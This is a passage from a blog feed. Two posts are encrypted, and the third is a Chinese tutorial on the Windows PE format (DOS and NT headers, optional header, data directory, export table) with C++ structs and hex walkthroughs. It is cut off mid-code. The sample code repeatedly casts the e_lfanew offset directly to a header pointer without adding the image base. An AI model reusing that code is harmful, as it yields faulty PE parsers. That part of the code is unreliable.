        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="577e217b54244da0e3ebd6dd129db509ac83619bb447c6cb0840406393ea0d45">b3c9a99c0ccdca4a7128185684909d47c7b4109eddc3e1e95fa17bdb523e92f722847be14227be29c7db769c5cb47ad0d2a1203cfe659615bdeaefc4c608ce3df8bd50f7441efb571f33f083aafaa7f7d1eebbb9bcba7516a66789c5c43acce27808da16cbd9057c910963fffc982aea60936a79fe42a2064c895fad30d4160df552636133b5a18584b6da8421c95fa0</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请联系管理员获取密码</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言总结</title>
      <link href="/2020/12/24/C%E8%AF%AD%E8%A8%80%E6%80%BB%E7%BB%93/"/>
      <url>/2020/12/24/C%E8%AF%AD%E8%A8%80%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="a20011e278ffb352d49f84273b93e1b80659b73ac4f056b2a7917c358788ee91"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入正确的密码</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> C/C++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PE文件结构</title>
      <link href="/2020/11/24/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/"/>
      <url>/2020/11/24/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h2 id="什么是文件"><a href="#什么是文件" class="headerlink" title="什么是文件"></a>什么是文件</h2><p>存储数据的实体。</p><p>不同的文件是给不同的软件去使用的。不同的文件主要是格式不同。</p><p>格式就是数组的排列组织方式</p><p>。软件读取文件，按照固定的形式去解析文件的。</p><h2 id="什么是PE文件"><a href="#什么是PE文件" class="headerlink" title="什么是PE文件"></a>什么是PE文件</h2><p>（Portable Executable）可执行 文件的缩写。这种类型的文件，是供windows系统解析，解析完了之后能够创建出进程去运行的文件。</p><h2 id="PE头部信息"><a href="#PE头部信息" class="headerlink" title="PE头部信息"></a>PE头部信息</h2><p>（DOS头，NT头，区段表）</p><p>我们学习PE文件学习的是什么呢？？学习的就是PE文件的格式，学习格式就是在学习一堆结构体。很多东西需要记忆。</p><p>为了便于我们记忆，需要一些辅助性的工具。</p><h3 id="PE头部粗略图"><a href="#PE头部粗略图" class="headerlink" title="PE头部粗略图"></a>PE头部粗略图</h3><p><img src="/2020/11/24/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/1.png" alt="image-1"></p><h2 id="DOS头"><a href="#DOS头" class="headerlink" title="DOS头"></a>DOS头</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>在windows系统中的可执行文件在设计的时候，考虑到了兼容性问题。在正常的可执行文件的一开始的部分。嵌入了一个DOS可执行文件。作用就是在MS-DOS系统下能够输出一行这个程序不是运行在此系统下的。</p><p><img src="/2020/11/24/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/2.png" alt="image-2"></p><p>这里有两个字段是有用的：</p><p>第一个 e_magic 永远都是 0x4D 0x5A 0x5A4D 你需要知道大端和小端的知识。</p><p>最后一个 e_lfanew 它是真正的可执行文件的起始位置。</p><ul><li>实验一:假如我们修改了e_magic字段或者e_lfanew，PE文件是否还能运行？<ul><li>将e_magic修改为”OZ”，保存执行</li><li>将e_magic改回”MZ”，e_lfanew改为0x1000，保存执行</li></ul></li></ul><p>尝试之后不行，这两个字段是重要字段，抹掉程序就无法运行了。</p><ul><li>实验二：抹掉除了e_magic和e_lfanew之外的字段，可不可以。</li></ul><h3 id="怎么找到DOS头"><a href="#怎么找到DOS头" class="headerlink" title="怎么找到DOS头"></a>怎么找到DOS头</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//lpImage是ReadFile打开文件后的写入的缓冲区（堆空间）</span></span><br><span class="line">PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpImage;</span><br><span class="line"><span class="comment">//pDos的e_magic字段，作为是否为PE文件的标志</span></span><br><span class="line">pDos-&gt;e_magic == IMAGE_DOS_SIGNATURE</span><br><span class="line"><span class="comment">//pDos的e_lfanew字段可以指向NT头的空间</span></span><br><span class="line">PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)pDos-&gt;e_lfanew;</span><br><span class="line"></span><br><span class="line"><span class="comment">//例：</span></span><br><span class="line"><span class="comment">//1 打开文件</span></span><br><span class="line">HANDLE hFile = <span class="built_in">CreateFile</span>(</span><br><span class="line">PATH,</span><br><span class="line">GENERIC_ALL,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line">OPEN_EXISTING,</span><br><span class="line">FILE_ATTRIBUTE_NORMAL,</span><br><span class="line"><span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line"><span class="comment">//2 获取文件大小</span></span><br><span class="line">DWORD dwFileSize = <span class="built_in">GetFileSize</span>(hFile, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//3 申请空间并初始化</span></span><br><span class="line"><span class="type">char</span>* buf = <span class="keyword">new</span> <span class="type">char</span>[dwFileSize] &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="comment">//4 读取文件</span></span><br><span class="line">DWORD dwRealSize = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">ReadFile</span>(hFile, buf, dwFileSize, &amp;dwRealSize, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><h2 id="NT头"><a href="#NT头" class="headerlink" title="NT头"></a>NT头</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_NT_HEADERS</span></span><br><span class="line">&#123;</span><br><span class="line">    DWORD Signature;                        <span class="comment">// [0x00]PE标识</span></span><br><span class="line">    IMAGE_FILE_HEADER FileHeader;           <span class="comment">// [0x04]文件头</span></span><br><span class="line">    IMAGE_OPTIONAL_HEADER32 OptionalHeader; <span class="comment">// [0x18]扩展头</span></span><br><span class="line">&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;</span><br></pre></td></tr></table></figure><p>怎么找到Nt头?</p><p>通过DOS头的最后一个字段：e_lfanew 指定的是NT头的位置</p><p>Signature：</p><p>标识：PE00</p><p>可以和魔数配合，判断是否是PE文件。</p><p>永远都是 0x50 0x45 0x00 0x00 0x00004550</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//打开PE文件后，第一个段就是DOS头部</span></span><br><span class="line">PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpImage;</span><br><span class="line"><span class="comment">//pDos的e_lfanew字段可以指向NT头的空间，使用NT头接收</span></span><br><span class="line">PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)pDos-&gt;e_lfanew;</span><br></pre></td></tr></table></figure><p>IMAGE_FILE_HEADER：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_FILE_HEADER</span> &#123;</span><br><span class="line">    WORD     Machine;        <span class="comment">//[0x04] （1）运行平台</span></span><br><span class="line">    WORD     NumberOfSections;<span class="comment">//[0x06] （2）区段的数量*</span></span><br><span class="line">    DWORD   TimeDateStamp;    <span class="comment">//[0x08] （3）文件创建时间</span></span><br><span class="line">    DWORD   PointerToSymbolTable;<span class="comment">//[0x0C] （4）符号表指针</span></span><br><span class="line">    DWORD   NumberOfSymbols;  <span class="comment">//[0x10] （5）符号的数量</span></span><br><span class="line">    WORD     SizeOfOptionalHeader;<span class="comment">//[0x14] （6）扩展头大小*</span></span><br><span class="line">    WORD     Characteristics;  <span class="comment">//[0x16] （7）文件属性</span></span><br><span class="line">&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;</span><br></pre></td></tr></table></figure><p><img src="/2020/11/24/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/3.png" alt></p><p>重要的：</p><p>NumberOfSection：区段的数量</p><p>SizeOfOptionalHeader：扩展头的大小。因为扩展头中数据目录表的个数是不确定的。所以这里需要一个大小</p><p>有用的：</p><p>Machine：运行平台</p><p>TimeDateStamp：时间戳 表明是在什么时候编译的</p><p>手工解析</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Code</span><br><span class="line">50 45 00 00 4C 01 05 00 91 CF 44 54 00 00 00 00</span><br><span class="line">00 00 00 00 E0 00 02 01 </span><br></pre></td></tr></table></figure><p>50 45 00 00 PE标识</p><p>01 4C 运行平台</p><p>00 没用</p><p>05 区段数量</p><p>91 CF 44 54 时间戳</p><p>E0 扩展头大小</p><p>0201 属性</p><p>因为大端小端，我们需要反过来看</p><h3 id="关于镜像，映像，虚拟地址，相对虚拟地址"><a href="#关于镜像，映像，虚拟地址，相对虚拟地址" class="headerlink" title="关于镜像，映像，虚拟地址，相对虚拟地址"></a>关于镜像，映像，虚拟地址，相对虚拟地址</h3><p>镜像：就是PE文件自身</p><p>映像：就是根据PE文件映射出来的，</p><p>虚拟地址：程序中的内存地址，就是虚拟地址。</p><p>相对虚拟地址：就是相对于加载基址的偏移。</p><h2 id="文件头"><a href="#文件头" class="headerlink" title="文件头"></a>文件头</h2><p>IMAGE_FILE_HEADER</p><h3 id="文件头结构体"><a href="#文件头结构体" class="headerlink" title="文件头结构体"></a>文件头结构体</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_FILE_HEADER</span> &#123;</span><br><span class="line">    WORD    Machine;<span class="comment">//运行平台</span></span><br><span class="line">    WORD    NumberOfSections;<span class="comment">//区段的数量</span></span><br><span class="line">    DWORD   TimeDateStamp;<span class="comment">//文件创建的时间</span></span><br><span class="line">    DWORD   PointerToSymbolTable;<span class="comment">//符号表偏移</span></span><br><span class="line">    DWORD   NumberOfSymbols;<span class="comment">//符号个数</span></span><br><span class="line">    WORD    SizeOfOptionalHeader;<span class="comment">//扩展头大小</span></span><br><span class="line">    WORD    Characteristics;<span class="comment">//PE文件的一些属性</span></span><br><span class="line">&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;</span><br></pre></td></tr></table></figure><h3 id="怎么找到文件头"><a href="#怎么找到文件头" class="headerlink" title="怎么找到文件头"></a>怎么找到文件头</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//打开PE文件后，第一个段就是DOS头部</span></span><br><span class="line">PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpImage;</span><br><span class="line"><span class="comment">//pDos的e_lfanew字段可以指向NT头的空间，使用NT头接收</span></span><br><span class="line">PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)pDos-&gt;e_lfanew;</span><br><span class="line"><span class="comment">//NT头结构体的第二个参数就是指向扩展头</span></span><br><span class="line">PIMAGE_FILE_HEADER pFile = (PIMAGE_FILE_HEADER)&amp;pNt-&gt;FileHeader;</span><br></pre></td></tr></table></figure><h2 id="扩展头"><a href="#扩展头" class="headerlink" title="扩展头"></a>扩展头</h2><p>IMAGE_OPTIONAL_HEADER：</p><h3 id="找到扩展头"><a href="#找到扩展头" class="headerlink" title="找到扩展头"></a>找到扩展头</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//打开PE文件后，第一个段就是DOS头部</span></span><br><span class="line">PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpImage;</span><br><span class="line"><span class="comment">//pDos的e_lfanew字段可以指向NT头的空间，使用NT头接收</span></span><br><span class="line">PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)pDos-&gt;e_lfanew;</span><br><span class="line"><span class="comment">//NT头结构体的第三个参数就是指向扩展头</span></span><br><span class="line">PIMAGE_OPTIONAL_HEADER pOption =  (PIMAGE_OPTIONAL_HEADER)&amp;pNt-&gt;OptionalHeader;</span><br></pre></td></tr></table></figure><h3 id="扩展头结构体"><a href="#扩展头结构体" class="headerlink" title="扩展头结构体"></a>扩展头结构体</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_OPTIONAL_HEADER</span> &#123;</span><br><span class="line">    <span class="comment">// 标准域</span></span><br><span class="line">    WORD    Magic;<span class="comment">//[0x18] (1) 标志位</span></span><br><span class="line">    BYTE    MajorLinkerVersion; <span class="comment">//[0x1A] (2) 连接器主版本号</span></span><br><span class="line">    BYTE    MinorLinkerVersion; <span class="comment">//[0x1B] (3) 连接器子版本号</span></span><br><span class="line">    DWORD   SizeOfCode; <span class="comment">//[0x1C] (4) 所有代码段 的总大小</span></span><br><span class="line">    DWORD   SizeOfInitializedData; <span class="comment">//[0x20] (5) 所有初始化段总大小</span></span><br><span class="line">    DWORD   SizeOfUninitializedData;<span class="comment">//[0x24] (6) 所有未初始化段总大小</span></span><br><span class="line">    DWORD   AddressOfEntryPoint;<span class="comment">//[0x28] (7) 程序执行入口RVA*</span></span><br><span class="line">    DWORD   BaseOfCode; <span class="comment">//[0x2C] (8) 代码段起始RVA</span></span><br><span class="line">    DWORD   BaseOfData; <span class="comment">//[0x30] (9) 数据段起始RVA</span></span><br><span class="line">    <span class="comment">// NT 附加域</span></span><br><span class="line">    DWORD   ImageBase; <span class="comment">//[0x34] (10) 程序默认载入基地址*</span></span><br><span class="line">    DWORD   SectionAlignment; <span class="comment">//[0x38] (11) 内存中的段对齐值</span></span><br><span class="line">    DWORD   FileAlignment; <span class="comment">//[0x3C] (12) 文件中的段对齐值</span></span><br><span class="line">    WORD    MajorOperatingSystemVersion; <span class="comment">//[0x40] (13) 系统主版本号</span></span><br><span class="line">    WORD    MinorOperatingSystemVersion; <span class="comment">//[0x42] (14) 系统子版本号</span></span><br><span class="line">    WORD    MajorImageVersion; <span class="comment">//[0x44] (15) 自定义的主版本号</span></span><br><span class="line">    WORD    MinorImageVersion;<span class="comment">//[0x46] (16) 自定义的子版本号</span></span><br><span class="line">    WORD    MajorSubsystemVersion; <span class="comment">//[0x48] (17) 所需子系统主版本号</span></span><br><span class="line">    WORD    MinorSubsystemVersion; <span class="comment">//[0x4A] (18) 所需子系统子版本号</span></span><br><span class="line"> DWORD   Win32VersionValue;<span class="comment">//[0x4C] (19) 保留，通常为0x00</span></span><br><span class="line">    DWORD   SizeOfImage; <span class="comment">//[0x50] (20) 内存中映像总尺寸*</span></span><br><span class="line">    DWORD   SizeOfHeaders; <span class="comment">//[0x54] (21) 各个文件头的总尺寸*</span></span><br><span class="line">    DWORD   CheckSum; <span class="comment">//[0x58] (22) 映像文件校验和</span></span><br><span class="line">    WORD     Subsystem;             <span class="comment">//[0x5C] (23) 文件子系统</span></span><br><span class="line">    WORD     DllCharacteristics; <span class="comment">//[0x5E] (24) DLL标志位</span></span><br><span class="line">    DWORD   SizeOfStackReserve;         <span class="comment">//[0x60] (25) 初始化栈大小</span></span><br><span class="line">    DWORD   SizeOfStackCommit;        <span class="comment">//[0x64] (26) 初始化实际提交栈大小</span></span><br><span class="line">    DWORD   SizeOfHeapReserve;         <span class="comment">//[0x68] (27) 初始化保留栈大小</span></span><br><span class="line">    DWORD   SizeOfHeapCommit;         <span class="comment">//[0x6C] (28) 初始化实际保留栈大小</span></span><br><span class="line">    DWORD   LoaderFlags;                <span class="comment">//[0x70] (29) 调试相关，默认0x00</span></span><br><span class="line">    DWORD   NumberOfRvaAndSizes;  <span class="comment">//[0x74] (30) 数据目录表的数量*</span></span><br><span class="line">    IMAGE_DATA_DIRECTORY DataDirectory[<span class="number">0x10</span>]; <span class="comment">//[0x78] (31) 数据目录表*</span></span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;</span><br></pre></td></tr></table></figure><p><img src="/2020/11/24/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/4.png" alt="image-4"></p><p><strong>非常重要的：</strong></p><p>ImageBase：程序的默认加载基址。</p><p>AddressOfEntryPoint： 程序的入口点（EP）。</p><p>比较重要的：</p><p>SectionAlignment： 内存对齐 0x1000（因为一页内存是4KB）</p><p>FileAlignment： 文件对齐 0x200</p><p>SizeOfImage： 映像大小（我这个PE文件被加载到内存，占用空间应该是多大）</p><p>SIzeOfHeader： 头部大小 DOS头+NT头+区块表的大小。</p><p>NumberOfRvaAndSizes: 数据目录表的元素个数</p><p>DllCharacteristics： PE的一组属性。。。。</p><p>极为重要的：</p><h2 id="数据目录表"><a href="#数据目录表" class="headerlink" title="数据目录表"></a>数据目录表</h2><p>DataDirectory</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//打开PE文件后，第一个段就是DOS头部</span></span><br><span class="line">PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpImage;</span><br><span class="line"><span class="comment">//pDos的e_lfanew字段可以指向NT头的空间，使用NT头接收</span></span><br><span class="line">PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)pDos-&gt;e_lfanew;</span><br><span class="line"><span class="comment">//NT头结构体的第三个参数就是指向扩展头</span></span><br><span class="line">PIMAGE_OPTIONAL_HEADER pOption =  (PIMAGE_OPTIONAL_HEADER)&amp;pNt-&gt;OptionalHeader;</span><br><span class="line"><span class="comment">//扩展头最后一个参数就是数据目录表</span></span><br><span class="line">PIMAGE_DATA_DIRECTORY pDataDir = pOption-&gt;DataDirectory;</span><br></pre></td></tr></table></figure><p>描述了PE文件中16个非常重要的数据块的大小和位置。</p><p><img src="/2020/11/24/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/5.png" alt="image-5"></p><h3 id="导出表"><a href="#导出表" class="headerlink" title="导出表"></a>导出表</h3><h4 id="什么是导出"><a href="#什么是导出" class="headerlink" title="什么是导出"></a>什么是导出</h4><p>提供函数给其他模块使用的一种行为</p><h4 id="怎么导出"><a href="#怎么导出" class="headerlink" title="怎么导出"></a>怎么导出</h4><p>方法1：声明导出</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> _declspec(dllexport) <span class="function"><span class="type">void</span> <span class="title">Fun1</span><span class="params">()</span></span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> _declspec(dllexport) <span class="function"><span class="type">void</span> <span class="title">Fun2</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure><p>方法2：def文件导出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">EXPORTS </span><br><span class="line">Fun3 @1 </span><br><span class="line">Fun4 @2 NONAME</span><br></pre></td></tr></table></figure><p>注意：NONAME 是只导出序号，没有名字</p><p>导出表的作用是什么? 没有它exe能运行吗?</p><p>用以记录本模块能够给其他模块提供的函数的信息。</p><p>函数名 函数地址 函数的序号</p><p>程序运行的时候，会检查主模块的导入表，看用了哪些其他模块，就会将此模块加载到进程空间中。加载进来之后，分析INT（IAT）得到函数名称，用这个名称去导出表中找到函数地址的RVA，RVA+模块基址，就是真正的函数地址，将此函数地址填充到IAT中，从而完成加载后的IAT功能。</p><p>一个PE文件，可以没有导出表的，比如exe文件，一般都没有。</p><p>已知一个dll名,和一个dll导出函数的名字, 如何得到这个函数名的地址?</p><p>得到DLL的导出表，然后在函数名称表中找函数名，如果找到了，由于序号表和名称表位置是一一对应的，就会得到序号表的下标，然后就将序号当成地址表的下标，从而得到地址。</p><p>GetProcAddress();</p><p>怎么才能知道一个exe都使用了哪些API?</p><p>分析exe的导入表即可，其中记录了模块名和函数名。</p><p>如何判断导入函数是以序号导入或是以名称导入?</p><p>IMAGE_THUNK_DATA32这个结构体，他的最高位是1的话，那么就只有序号，如果最高位是0的话，那么久有序号，也有名称。</p><p>怎么才知道导出函数是仅以序号导出还是以名称导出?</p><p>对于一个导出函数而言，他的地址表的下标，就是此函数的序号，如果这个序号，在序号表中，没有记录，那么他就是一个虚序号，也就是没有名称，只有序号。</p><h4 id="怎么找到一个PE文件的导出信息"><a href="#怎么找到一个PE文件的导出信息" class="headerlink" title="怎么找到一个PE文件的导出信息"></a>怎么找到一个PE文件的导出信息</h4><p>通过数据目录表的第0项：</p><h4 id="手工分析过程："><a href="#手工分析过程：" class="headerlink" title="手工分析过程："></a>手工分析过程：</h4><p><img src="/2020/11/24/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/6.png" alt="iamge-6"></p><h5 id="获得信息："><a href="#获得信息：" class="headerlink" title="获得信息："></a>获得信息：</h5><p>导出表的RVA：00018D90 ——&gt;FOA： 7590 (FOA= RVA - RVA区段+ FOA区段)</p><p>备注：</p><p> FOA:文件的偏移位置</p><p> RVA：相对虚拟地址</p><p> RVA区段：该段段首地址</p><p> FOA区段：文件偏移的段首地址</p><p>SIZE：5F21</p><p><img src="/2020/11/24/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/7.png" alt="image-7"></p><p>模块名称在12个字节后的四个字节中，也就是0x0001DBEA</p><p>Base:00 00 00 01 索引基数</p><p>NumberOfFunctions:00 00 13 88 导出地址表中成员个数</p><p>NumberOfNames:00 00 00 03</p><p>AddressOfFunctions(rva):00 01 8D B8 导出地址表（EAT）</p><p>AddressOfNames(rva):00 01 DB D8 导出名称表（ENT）</p><p>AddressOfNameOrdinals;：0x1DBE4 指向导出序号表</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_EXPORT_DIRECTORY</span> &#123;</span><br><span class="line">    DWORD  Characteristics;   <span class="comment">// (1) 保留，恒为0x00000000</span></span><br><span class="line">    DWORD  TimeDateStamp;   <span class="comment">// (2) 时间戳</span></span><br><span class="line">    WORD   MajorVersion;   <span class="comment">// (3) 主版本号，一般不赋值</span></span><br><span class="line">    WORD   MinorVersion;   <span class="comment">// (4) 子版本号，一般不赋值</span></span><br><span class="line">    DWORD  Name;   <span class="comment">// (5) 模块名称*</span></span><br><span class="line">    DWORD  Base;   <span class="comment">// (6) 索引基数*</span></span><br><span class="line">    DWORD  NumberOfFunctions;  <span class="comment">// (7) 导出地址表中成员个数*</span></span><br><span class="line">    DWORD  NumberOfNames;    <span class="comment">// (8) 导出名称表中成员个数*</span></span><br><span class="line">    DWORD  AddressOfFunctions; <span class="comment">// (9) 导出地址表（EAT）*</span></span><br><span class="line">    DWORD  AddressOfNames;   <span class="comment">// (10) 导出名称表（ENT）*</span></span><br><span class="line">    DWORD  AddressOfNameOrdinals; <span class="comment">// (11) 指向导出序号表*</span></span><br><span class="line">&#125;IMAGE_EXPORT_DIRECTORY,*PIMAGE_EXPORT_DIRECTORY;</span><br></pre></td></tr></table></figure><p>模块名称0x0001DBEA 转换RVA —FOA: C3EA</p><p><img src="/2020/11/24/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/8.png" alt="image-8"></p><p>找到dll.dll</p><p>地址表成员个数为1388转换成字节：1388h=5000d 十六进制转换为十进制</p><p> 1388*4=4E20 十六进制数乘4</p><p> 5000*4=20000 十进制数乘4</p><p>我们从地址表：0x 18DB8开始找，由于18DB8是RVA，这里需要转换FOA:75B8</p><p><img src="/2020/11/24/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/9.png" alt="image-9"></p><p>AddressOfNameOrdinals;：1DBE4 指向导出序号表 转换FOA:C3E4</p><p><img src="/2020/11/24/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/10.png" alt="image-10"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span 